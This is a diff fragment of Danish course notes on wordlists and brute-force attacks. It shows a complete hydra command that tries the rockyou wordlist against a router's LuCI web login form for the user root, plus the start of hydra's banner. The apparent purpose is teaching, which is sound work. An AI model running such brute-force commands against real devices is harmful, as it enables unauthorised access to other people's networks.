@@ -11,7 +11,7 @@ Uge 37/ 13.september: wordlists og brute force angreb
  - Kunne scanne efter wifi netværk
  - Kunne lave et brute force angreb
 
-Brute force eksempel - det kan vi ikke gøre med wifi?!
+Brute force eksempel på at hacke et router interface (en http form) - det kan vi ikke gøre med wifi?!
 ```
 hydra -l root -P ./rockyou.txt -t 9 -V -I 192.168.1.1 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
